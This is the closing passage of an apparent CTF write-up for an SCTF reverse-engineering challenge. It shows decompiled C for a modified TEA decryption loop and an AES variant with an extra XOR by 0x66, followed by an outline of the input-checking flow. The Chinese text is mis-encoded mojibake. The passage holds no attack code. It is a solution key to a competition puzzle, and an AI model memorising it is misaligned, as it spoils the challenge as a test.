</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=mi>31</span><span class=p>;</span> <span class=n>i</span><span class=o>&gt;=</span><span class=mi>0</span><span class=p>;</span> <span class=n>i</span><span class=o>--</span><span class=p>)</span> <span class=p>{</span>                         <span class=cm>/* basic cycle start */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v2</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k0</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>v2</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v2</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v1</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v0</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k0</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>v0</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v0</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v2</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v3</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k2</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>v3</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v3</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k3</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum2</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>v0</span> <span class=o>-=</span> <span class=p>((</span><span class=n>v1</span><span class=o>&lt;&lt;</span><span class=mi>4</span><span class=p>)</span> <span class=o>+</span> <span class=n>k2</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>v1</span><span class=p>)</span> <span class=o>^</span> <span class=p>((</span><span class=n>v1</span><span class=o>&gt;&gt;</span><span class=mi>5</span><span class=p>)</span> <span class=o>+</span> <span class=n>k3</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=n>sum1</span> <span class=o>+</span> <span class=n>i</span><span class=p>);</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sum1</span> <span class=o>-=</span> <span class=n>delta</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>sum2</span> <span class=o>-=</span> <span class=n>delta</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>                                              <span class=cm>/* end cycle */</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>=</span><span class=n>v0</span><span class=p>;</span> <span class=n>v</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>=</span><span class=n>v1</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>=</span><span class=n>v2</span><span class=p>;</span> <span class=n>v</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>=</span><span class=n>v3</span><span class=p>;</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> 
</span></span></code></pre></td></tr></table></div></div><p>AESé­”æ”¹éƒ¨åˆ†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>oid</span> <span class=kr>__cdecl</span> <span class=nf>enc_next</span><span class=p>(</span><span class=kt>uint8_t</span> <span class=o>*</span><span class=n>roundkeys</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>plaintext</span><span class=p>,</span> <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>_DWORD</span> <span class=o>*</span><span class=n>v3</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>_DWORD</span> <span class=o>*</span><span class=n>v4</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>type_info</span> <span class=o>*</span><span class=n>v5</span><span class=p>;</span> <span class=c1>// rdx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>v6</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>v7</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>v8</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>v9</span><span class=p>;</span> <span class=c1>// rbx
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>void</span> <span class=o>*</span><span class=n>v10</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=o>*</span><span class=n>v11</span><span class=p>;</span> <span class=c1>// rax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>std</span><span class=o>::</span><span class=n>__cxx11</span><span class=o>::</span><span class=n>string</span> <span class=n>temp_2</span><span class=p>;</span> <span class=c1>// [rsp+20h] [rbp-60h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=n>tmp</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=c1>// [rsp+40h] [rbp-40h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>v14</span><span class=p>;</span> <span class=c1>// [rsp+5Eh] [rbp-22h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=n>t</span><span class=p>;</span> <span class=c1>// [rsp+5Fh] [rbp-21h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>double</span> <span class=n>temp_1</span><span class=p>;</span> <span class=c1>// [rsp+60h] [rbp-20h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>temp_0</span><span class=p>;</span> <span class=c1>// [rsp+6Ch] [rbp-14h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>temp</span><span class=p>;</span> <span class=c1>// [rsp+73h] [rbp-Dh]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>a</span><span class=p>;</span> <span class=c1>// [rsp+74h] [rbp-Ch]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>cnt</span><span class=p>;</span> <span class=c1>// [rsp+78h] [rbp-8h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=n>j</span><span class=p>;</span> <span class=c1>// [rsp+7Eh] [rbp-2h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+7Fh] [rbp-1h]
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>v3</span> <span class=o>=</span> <span class=nf>_cxa_allocate_exception</span><span class=p>(</span><span class=mi>4u</span><span class=n>i64</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>v3</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>refptr__ZTIi</span> <span class=o>!=</span> <span class=p>(</span><span class=k>struct</span> <span class=n>type_info</span> <span class=o>*</span><span class=k>const</span><span class=p>)</span><span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>Unwind_Resume</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>a</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)</span><span class=nf>_cxa_begin_catch</span><span class=p>(</span><span class=n>v3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mh>0xFu</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v8</span> <span class=o>=</span> <span class=n>roundkeys</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ciphertext</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=o>*</span><span class=n>v8</span> <span class=o>^</span> <span class=n>plaintext</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=mh>0x66</span><span class=p>;</span> <span class=c1>// å¤šäº†ä¸€ä¸ª^0x66
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>_cxa_end_catch</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// åé¢é€»è¾‘å¤§è‡´æ•´ç†
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>CipherSCTF</span><span class=p>(</span><span class=kt>state_t</span><span class=o>*</span> <span class=n>state</span><span class=p>,</span> <span class=k>const</span> <span class=kt>uint8_t</span><span class=o>*</span> <span class=n>RoundKey</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>uint8_t</span> <span class=n>round</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// Add the First round key to the state before starting the rounds.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nf>AddRoundKeyDec</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>state</span><span class=p>,</span> <span class=n>RoundKey</span><span class=p>);</span> <span class=c1>// ciphertext[i] = *v8 ^ plaintext[i] ^ 0x66; // å¤šäº†ä¸€ä¸ª^0x66
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// There will be Nr rounds.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// The first Nr-1 rounds are identical.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// These Nr rounds are executed in the loop below.
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=c1>// Last one without InvMixColumn()
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span><span class=n>round</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>;</span> <span class=o>++</span><span class=n>round</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>InvShiftRows</span><span class=p>(</span><span class=n>state</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>InvSubBytes</span><span class=p>(</span><span class=n>state</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>MixColumns</span><span class=p>(</span><span class=n>state</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>AddRoundKey</span><span class=p>(</span><span class=n>round</span><span class=p>,</span> <span class=n>state</span><span class=p>,</span> <span class=n>RoundKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>round</span> <span class=o>==</span> <span class=n>Nr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nf>SubBytes</span><span class=p>(</span><span class=n>state</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nf>ShiftRows</span><span class=p>(</span><span class=n>state</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=nf>AddRoundKey</span><span class=p>(</span><span class=n>round</span><span class=p>,</span> <span class=n>state</span><span class=p>,</span> <span class=n>RoundKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>åŠ å¯†æµç¨‹ï¼š</p><p>- è¾“å…¥32ä¸ªå­—ç¬¦</p><ul><li>TEAå¤„ç†å‰16ä¸ª</li><li>AESå¤„ç†å‰16ä¸ª</li><li>TEAå¤„ç†å16ä¸ª</li><li>AESå¤„ç†å16ä¸ª</li><li>æ¯”è¾ƒ</li></ul><p>æ ¹æ®ä¸Šè¿°æè¿°å†™å‡ºè§£å¯†å³å¯</p><div class=blog-tags><a href=https://su-team.cn/tags/sctf/>SCTF</a>&nbsp;</div></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/2021-rctf-harmony-wu/ data-toggle=tooltip data-placement=top title="2021 RCTF Harmony Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/rwctf-2022-su-wu/ data-toggle=tooltip data-placement=top title="2022 RWCTFä½“éªŒèµ› SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>